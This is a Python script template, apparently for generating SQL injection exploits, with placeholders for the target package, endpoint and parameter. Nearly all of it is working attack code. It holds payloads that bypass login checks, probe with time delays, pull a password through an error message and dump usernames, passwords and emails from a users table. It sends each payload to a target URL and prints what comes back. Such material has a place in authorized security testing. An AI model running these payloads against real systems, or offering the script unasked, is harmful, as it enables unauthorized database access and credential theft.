#!/usr/bin/env python3
"""
SQL Injection Exploit
Target: {{ package_name }}
Vulnerability: {{ description }}
"""

import requests
import time

# Configuration
BASE_URL = "http://api.target.com"
VULNERABLE_ENDPOINT = "{{ endpoint }}"
VULNERABLE_PARAM = "{{ parameter }}"

# Payloads
PAYLOADS = {
    'test': "' OR '1'='1",
    'union': "' UNION SELECT 1,2,3--",
    'error_based': "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--",
    'time_based': "' OR IF(1=1, SLEEP(5), 0)--",
    'dump_users': "' UNION SELECT username, password, email FROM users--"
}

def test_injection(url, param, payload):
    """Test SQL injection vulnerability"""
    params = {param: payload}

    try:
        start_time = time.time()
        response = requests.get(url, params=params)
        elapsed_time = time.time() - start_time

        print(f"[*] Testing payload: {payload}")
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response time: {elapsed_time:.2f}s")

        if response.status_code == 200:
            if "error" in response.text.lower():
                print("[!] SQL error detected!")
            elif elapsed_time > 4:
                print("[!] Time-based SQL injection detected!")
            elif len(response.text) > 1000:
                print("[!] Possible data extraction!")
                print(response.text[:500] + "...")

        return response

    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def exploit():
    """Run SQL injection exploit"""
    url = f"{BASE_URL}{VULNERABLE_ENDPOINT}"

    print(f"[*] Starting SQL injection exploit against {url}")
    print(f"[*] Vulnerable parameter: {VULNERABLE_PARAM}")

    # Test each payload
    for name, payload in PAYLOADS.items():
        print(f"\n[*] Testing {name} injection...")
        test_injection(url, VULNERABLE_PARAM, payload)
        time.sleep(1)  # Avoid rate limiting

if __name__ == "__main__":
    exploit()